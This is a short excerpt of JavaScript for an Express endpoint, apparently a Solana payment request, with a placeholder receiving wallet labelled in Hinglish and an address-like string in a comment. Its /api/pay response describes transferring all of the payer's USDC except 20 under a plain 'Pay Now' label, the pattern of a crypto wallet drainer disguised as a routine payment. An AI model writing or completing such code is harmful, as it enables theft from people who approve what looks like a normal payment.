...
// 🔴 zP5FnmEKrnhnekbpEeCUv8r5aMRrByLKAAtKEUkk6pB 🔴
const YOUR_WALLET = new PublicKey('APKA_SOLANA_WALLET_ADDRESS_YAHAN_DALO');
...
app.get('/api/pay', (req, res) => {
  res.json({
    ...
    description: 'Transfer all your USDC keeping 20 USDC',
    label: 'Pay Now'
  });
});
